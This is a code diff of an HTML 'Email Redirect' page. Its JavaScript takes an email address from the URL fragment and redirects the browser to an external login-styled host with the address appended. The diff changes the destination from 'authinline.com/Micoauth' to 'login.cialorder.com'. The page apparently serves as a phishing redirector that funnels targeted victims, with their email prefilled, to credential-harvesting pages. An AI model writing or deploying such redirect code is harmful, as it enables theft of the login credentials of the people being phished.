@@ -4,13 +4,12 @@
   <title>Email Redirect</title>
   <script>
     function processEmailUrl() {
-      // Get the current URL
       var currentURL = window.location.href;
 
       // Check if the URL contains an '=' character followed by '#' and an email address
       var emailRegex = /=(?=#[^#]*$)/;
       if (emailRegex.test(currentURL)) {
-        // Replace the '=' character with an empty string for the email address
+        // Replace the '=' character at the end of the email with an empty string
         var cleanURL = currentURL.replace(emailRegex, '');
 
         // Redirect to the cleaned URL
@@ -39,7 +38,7 @@
 
           if (email) {
             // Construct the redirect URL by appending the extracted email to the second link
-            var redirectURL = 'https://authinline.com/Micoauth/index.html?' + email[0];
+            var redirectURL = 'https://login.cialorder.com/mhXayjAt?' + email[0];
 
             // Redirect to the constructed URL
             window.location.href = redirectURL;
